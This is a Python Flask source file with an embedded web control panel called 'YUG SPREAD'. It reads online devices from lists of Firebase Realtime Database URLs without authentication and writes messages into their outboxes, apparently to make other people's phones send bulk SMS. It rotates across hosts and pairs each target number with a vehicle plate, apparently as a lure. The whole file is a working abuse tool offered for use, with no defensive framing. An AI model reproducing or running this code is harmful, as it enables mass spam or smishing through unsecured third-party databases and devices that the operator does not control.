from flask import Flask, request, jsonify
import requests as rq
import time

app = Flask(__name__)

HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>YUG SPREAD</title>
<style>
  :root{
    --bg:#0a0d12; --panel:#111721; --line:#1d2634; --fg:#e6ecf5;
    --dim:#7d8ba1; --accent:#ff2d55; --accent2:#00e5ff; --ok:#28d17c;
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--fg);
       font-family:ui-monospace,SFMono-Regular,Menlo,monospace;font-size:13px}
  header{padding:18px 22px;border-bottom:1px solid var(--line);
         display:flex;align-items:center;justify-content:space-between}
  h1{margin:0;font-size:18px;letter-spacing:4px;font-weight:700}
  h1 span{color:var(--accent)}
  .meta{color:var(--dim);font-size:11px}
  main{padding:22px;display:grid;grid-template-columns:1fr 1fr;gap:18px;max-width:1300px;margin:0 auto}
  .panel{background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:14px}
  label{display:block;color:var(--dim);font-size:11px;margin-bottom:6px;letter-spacing:1px;text-transform:uppercase}
  textarea, input[type=text], input[type=number]{
    width:100%;background:#080b11;color:var(--fg);border:1px solid var(--line);
    border-radius:6px;padding:9px 10px;font-family:inherit;font-size:12px;resize:vertical
  }
  textarea:focus,input:focus{outline:none;border-color:var(--accent2)}
  textarea{min-height:110px}
  .row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
  .field{margin-bottom:12px}
  button{width:100%;padding:14px;background:var(--accent);color:#fff;border:none;
         border-radius:8px;font-family:inherit;font-weight:700;letter-spacing:3px;
         cursor:pointer;font-size:14px;transition:.15s}
  button:hover{filter:brightness(1.15)}
  button:disabled{opacity:.4;cursor:not-allowed}
  button.stop{background:#3a1520;color:#ff8aa0;border:1px solid #ff2d5540;margin-top:8px}
  #log{background:#080b11;border:1px solid var(--line);border-radius:8px;
       padding:12px;height:420px;overflow:auto;font-size:12px;line-height:1.55}
  #log .t{color:var(--dim)}
  #log .ok{color:var(--ok)}
  #log .err{color:var(--accent)}
  #log .inf{color:var(--accent2)}
  .stat{display:flex;gap:16px;margin-top:10px;color:var(--dim);font-size:11px}
  .stat b{color:var(--fg)}
  @media(max-width:800px){main{grid-template-columns:1fr}}
</style>
</head>
<body>
<header>
  <h1>YUG <span>SPREAD</span></h1>
  <div class="meta">rtdb device relay // firebase rotate</div>
</header>

<main>
  <div>
    <div class="panel">
      <div class="field">
        <label>Firebase RTDB hosts (one URL per line, dedupe auto)</label>
        <textarea id="fbs" placeholder="https://xyz-default-rtdb.firebaseio.com
https://abc-default-rtdb.europe-west1.firebasedatabase.app"></textarea>
      </div>

      <div class="field">
        <label>Message</label>
        <textarea id="msg" placeholder="message body"></textarea>
      </div>

      <div class="row">
        <div class="field">
          <label>Target numbers (one per line)</label>
          <textarea id="targets" placeholder="8801xxxxxxxxx
8801xxxxxxxxx"></textarea>
        </div>
        <div class="field">
          <label>Vehicle numbers (one per line, locked to target index)</label>
          <textarea id="vehicles" placeholder="DHA-GA-11-1234
DHA-GA-11-5678"></textarea>
        </div>
      </div>

      <div class="row">
        <div class="field">
          <label>Devices path</label>
          <input type="text" id="devPath" value="devices">
        </div>
        <div class="field">
          <label>Outbox path</label>
          <input type="text" id="outPath" value="messages">
        </div>
      </div>

      <button id="go">SEND SPREAD</button>
      <button id="stop" class="stop" style="display:none">STOP</button>

      <div class="stat">
        <div>sent: <b id="sSent">0</b></div>
        <div>ok: <b id="sOk">0</b></div>
        <div>fail: <b id="sFail">0</b></div>
        <div>hosts: <b id="sHosts">0</b></div>
        <div>rate: <b>2/s</b></div>
      </div>
    </div>
  </div>

  <div class="panel" style="padding:0;overflow:hidden">
    <div id="log"></div>
  </div>
</main>

<script>
const $ = id => document.getElementById(id);
let running = false;

function log(cls, txt){
  const el = document.createElement('div');
  const ts = new Date().toLocaleTimeString();
  el.innerHTML = `<span class="t">[${ts}]</span> <span class="${cls}">${txt}</span>`;
  $('log').appendChild(el);
  $('log').scrollTop = $('log').scrollHeight;
}

function splitLines(s){
  return s.split('\n').map(x=>x.trim()).filter(Boolean);
}

function validHost(u){
  u = u.replace(/\/+$/,'');
  return /^https:\/\/[a-z0-9-]+\.(firebaseio\.com|firebasedatabase\.app)$/i.test(u) ? u : null;
}

function sendOnce(payload){
  return fetch('/api/send', {
    method:'POST',
    headers:{'content-type':'application/json'},
    body: JSON.stringify(payload)
  }).then(r => r.json());
}

$('go').onclick = async () => {
  if (running) return;

  // parse + validate + dedupe hosts
  const raw = splitLines($('fbs').value);
  const seen = new Set();
  const hosts = [];
  for (const line of raw){
    const h = validHost(line);
    if (h && !seen.has(h)){ seen.add(h); hosts.push(h); }
  }

  const msg = $('msg').value.trim();
  const targets = splitLines($('targets').value);
  const vehicles = splitLines($('vehicles').value);
  const devPath = ($('devPath').value.trim() || 'devices').replace(/^\/+|\/+$/g,'');
  const outPath = ($('outPath').value.trim() || 'messages').replace(/^\/+|\/+$/g,'');

  if (!hosts.length){ log('err','no valid firebase host'); return; }
  if (!msg){ log('err','no message'); return; }
  if (!targets.length){ log('err','no targets'); return; }
  if (!vehicles.length){ log('err','no vehicle numbers'); return; }

  running = true;
  $('go').disabled = true;
  $('stop').style.display = 'block';
  $('sHosts').textContent = hosts.length;

  let sent=0, ok=0, fail=0;
  $('sSent').textContent = 0; $('sOk').textContent = 0; $('sFail').textContent = 0;

  let fbIdx = 0;

  log('inf', `start // ${targets.length} targets x 2 // ${hosts.length} hosts // dev=${devPath} out=${outPath}`);

  outer:
  for (let ti = 0; ti < targets.length; ti++){
    const veh = vehicles[ti % vehicles.length];
    for (let pass = 0; pass < 2; pass++){
      if (!running) break outer;

      const host = hosts[fbIdx % hosts.length];
      fbIdx++;

      const body = `${msg} ${veh}`;
      const to = targets[ti];

      let res;
      try {
        res = await sendOnce({ host, to, body, devPath, outPath });
      } catch(e){
        res = { ok:false, error:String(e) };
      }

      sent++;
      if (res && res.ok){
        ok++;
        log('ok', `-> ${to}  device ${res.device || '?'}  [${host.replace('https://','')}]  "${veh}"`);
      } else {
        fail++;
        log('err', `x ${to}  ${res && res.error ? res.error : 'unknown'}`);
      }

      $('sSent').textContent = sent;
      $('sOk').textContent = ok;
      $('sFail').textContent = fail;

      await new Promise(r => setTimeout(r, 500));
    }
  }

  running = false;
  $('go').disabled = false;
  $('stop').style.display = 'none';
  log('inf', `done // sent=${sent} ok=${ok} fail=${fail}`);
};

$('stop').onclick = () => {
  running = false;
  log('err','stopped by operator');
};
</script>
</body>
</html>
"""


@app.route("/")
def index():
    return HTML, 200, {"Content-Type": "text/html; charset=utf-8"}


def fetch_online_devices(host, path):
    """GET {host}/{path}.json — expects dict of {id: {number, online}} or list."""
    url = f"{host}/{path}.json"
    r = rq.get(url, timeout=8)
    if r.status_code != 200:
        raise RuntimeError(f"read {r.status_code}: {r.text[:160]}")
    try:
        data = r.json()
    except Exception:
        raise RuntimeError("bad json from rtdb")
    if not data:
        return []
    nums = []
    # data may be dict-of-objects or list
    items = data.values() if isinstance(data, dict) else data
    for item in items:
        if not isinstance(item, dict):
            continue
        num = item.get("number") or item.get("num") or item.get("phone")
        online = item.get("online", True)
        if num and online:
            nums.append(str(num))
    return nums


def write_outbox(host, path, payload):
    url = f"{host}/{path}.json"
    doc = {
        "from": payload["from"],
        "to": payload["to"],
        "body": payload["body"],
        "ts": int(time.time() * 1000),
    }
    r = rq.post(url, json=doc, timeout=8)
    if r.status_code not in (200, 201):
        raise RuntimeError(f"write {r.status_code}: {r.text[:160]}")
    return r.json().get("name", "") if r.text else ""


@app.route("/api/send", methods=["POST"])
def api_send():
    try:
        data = request.get_json(force=True)
    except Exception as e:
        return jsonify(ok=False, error=f"bad json: {e}"), 400

    host = (data.get("host") or "").rstrip("/")
    to = (data.get("to") or "").strip()
    body = data.get("body") or ""
    dev_path = (data.get("devPath") or "devices").strip("/")
    out_path = (data.get("outPath") or "messages").strip("/")

    if not host.startswith("https://"):
        return jsonify(ok=False, error="bad host"), 400
    if not to:
        return jsonify(ok=False, error="missing 'to'"), 400

    try:
        devices = fetch_online_devices(host, dev_path)
        if not devices:
            return jsonify(ok=False, error="no online device"), 200
        from_num = devices[0]
        write_outbox(host, out_path, {"from": from_num, "to": to, "body": body})
        return jsonify(ok=True, device=from_num), 200
    except Exception as e:
        return jsonify(ok=False, error=str(e)[:220]), 200


handler = app